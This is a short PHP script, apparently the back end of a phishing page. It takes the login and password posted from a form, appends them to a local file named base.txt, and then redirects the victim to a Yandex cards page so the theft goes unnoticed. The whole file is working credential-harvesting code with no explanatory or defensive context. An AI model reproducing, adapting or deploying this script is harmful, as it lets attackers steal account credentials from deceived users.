<?php
	$Login = $_POST['login'];
	$Passwd = $_POST['passwd'];

	$fp = fopen("base.txt","a+");
	fwrite($fp,"$Login:$Passwd\n");
	fclose($fp);

	header("Location: http://cards.yandex.ru/");
	echo "<META HTTP-EQUIV=\"Refresh\" content =\"0; URL=\"http://cards.yandex.ru/\">";
?>